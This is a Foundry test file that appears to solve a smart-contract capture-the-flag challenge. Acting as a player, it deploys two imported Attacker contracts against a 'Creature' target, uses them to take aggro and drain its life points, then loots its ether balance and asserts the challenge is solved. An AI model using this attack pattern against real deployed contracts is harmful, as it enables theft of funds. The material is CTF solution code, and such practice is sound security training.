// SPDX-License-Identifier: UNLICENSED

pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "../src/Setup.sol";
import "../src/Attacker.sol";

contract SolveTest is Test {
    address player = makeAddr("player");
    Setup public s;

    function setUp() public {
        s = new Setup{value: 1 ether}();
    }

    function testSolve() public {
        vm.startPrank(player);
        Creature c = Creature(s.TARGET());
        Attacker a1 = new Attacker(address(c));
        Attacker a2 = new Attacker(address(c));

        emit log("before");
        emit log_named_uint("lifePoints", c.lifePoints());
        emit log_named_address("aggro", c.aggro());
        emit log_named_address("c.txorigin", c.debugTxOrigin());
        emit log_named_address("c.msgsender", c.debugMsgSender());
        emit log_named_address("a1.txorigin", a1.debugTxOrigin());
        emit log_named_address("a1.msgsender", a1.debugMsgSender());
        emit log_named_address("address(c)", address(c));
        emit log_named_address("address(a1)", address(a1));
        emit log_named_address("address(this)", address(this));
        emit log_named_address("address(player)", address(player));
        emit log("take aggro");
        a1.attack(1); // take aggro
        emit log_named_uint("lifePoints", c.lifePoints());
        emit log_named_address("aggro", c.aggro());
        emit log("loot");
        a2.attack(1000); // take aggro
        emit log_named_uint("lifePoints", c.lifePoints());
        emit log_named_address("aggro", c.aggro());
        emit log_named_uint("balance", address(c).balance);
        emit log_named_uint("balance", address(c).balance);
        c.loot();
        emit log_named_uint("balance", address(c).balance);

        assertEq(s.isSolved(), true);
        vm.stopPrank();
    }
}
